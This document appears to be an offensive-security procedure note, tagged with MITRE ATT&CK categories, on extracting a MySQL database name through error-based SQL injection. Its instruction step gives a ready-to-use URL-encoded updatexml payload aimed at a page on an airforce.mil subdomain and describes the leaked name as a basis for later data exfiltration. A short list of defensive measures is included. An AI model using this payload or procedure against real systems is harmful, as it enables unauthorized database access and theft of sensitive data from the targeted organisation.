---
tags:
  - sqli
  - mysql
  - error-based
  - database-extraction
type: procedure
tools:
  - '[[tools/Firefox]]'
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.189Z'
sub_techniques: []
id: a0d7516d-fc36-4094-9534-6252c1d3de0d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Database-Name-via-SQL-Injection

## Summary

This procedure employs URL-encoded error-based SQL injection to extract the current MySQL database name, enabling schema mapping and sensitive data targeting.

## Description

For web apps vulnerable to unsanitized inputs in parameters like `id=`, this step uses the database() function in an updatexml payload, requiring URL encoding for special characters. Targeted at environments like military subdomains with MySQL, it assumes prior user/version extraction. Success exposes the DB name, facilitating table enumeration or dumping.

## Requirements

1. Confirmed injection with user and version details
2. Capability to URL-encode payloads
3. Browser access to the target

## Defense

Defensive measures and detection strategies:

- Parameterize all database queries
- Restrict error verbosity and implement input whitelisting
- Use intrusion detection for encoded SQL patterns like %27%20and%20updatexml

## Objectives

1. Reveal the active database name
2. Support schema discovery for data exfiltration
3. Highlight exposure of sensitive information

## Instructions

### Step 1: Deploy Encoded Payload

**Context**: Use URL encoding to inject the payload safely, targeting database() to leak the name via error.

Visit the encoded URL: https://subdomain.airforce.mil/page?id=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil

> Encoding handles spaces and quotes (%27 for ', %20 for space). The response error will include the database name in the XPath message.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]
- [[tools/Web-Browser]]

## Tags

- [[sqli]]
- [[mysql]]
- [[error-based]]
